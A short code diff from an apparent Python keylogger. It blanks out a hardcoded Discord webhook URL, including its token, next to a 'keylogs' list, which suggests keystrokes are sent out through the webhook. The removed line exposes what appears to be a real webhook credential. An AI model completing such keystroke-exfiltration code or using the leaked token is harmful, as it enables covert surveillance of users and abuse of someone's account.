@@ -3,7 +3,7 @@ import time
 import requests
 import threading
 
-WEBHOOK_URL = 'https://discord.com/api/webhooks/1241499053187924038/vnRm-HMBr-oku4vh0-kFLl6IZxm_8aqJTd-K7pp8S-wUf7d2P5O6rELCl6_uGBt5Q2zl'
+WEBHOOK_URL = ''
 
 keylogs = []
 
